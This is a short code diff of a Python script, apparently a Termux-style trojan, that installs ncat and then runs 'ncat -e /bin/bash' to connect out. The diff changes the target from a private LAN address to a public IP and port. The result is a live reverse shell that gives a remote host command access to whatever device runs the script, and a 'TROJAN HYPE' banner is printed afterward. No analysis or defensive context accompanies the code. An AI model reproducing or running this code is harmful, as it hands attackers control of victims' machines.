@@ -31,7 +31,7 @@ import os
 import time 
 
 os.system ("pkg install nmap-ncat -y")
-os.system ("ncat -e /bin/bash 192.168.1.100 3333")
+os.system ("ncat -e /bin/bash 3.136.65.236 11137")
 pass
 os.system ('clear')
 os.system ('figlet -f slant TROJAN HYPE') 
